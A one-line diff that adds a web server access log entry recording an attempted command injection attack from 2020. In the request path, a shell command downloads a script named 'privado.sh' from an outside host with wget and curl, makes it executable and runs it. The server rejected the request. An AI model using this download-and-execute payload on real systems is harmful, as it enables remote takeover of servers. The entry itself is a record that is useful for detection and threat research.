@@ -1,0 +1,1 @@
+104.237.234.24 - - [23/Mar/2020:07:47:20 +0200] "GET ;cd /tmp; wget http://isupreme.ir/privado.sh; curl -O http://isupreme.ir/privado.sh; chmod 777 privado.sh; ./privado.sh&PingCheck=Test HTTP/1.1" 400 150 "-" "-" "-"
